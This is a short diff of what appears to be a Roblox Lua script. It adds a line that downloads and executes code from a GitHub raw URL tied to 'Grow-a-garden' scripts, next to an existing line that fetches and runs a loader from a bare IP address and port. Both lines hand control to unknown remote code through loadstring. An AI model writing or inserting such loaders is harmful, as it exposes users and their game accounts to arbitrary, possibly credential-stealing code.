@@ -1,2 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/opgagscriptss/Grow-a-garden-scripts/refs/heads/main/wd",true))()
+
 ID="b6359156-ca11-47a2-a6b0-622b916f545a";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
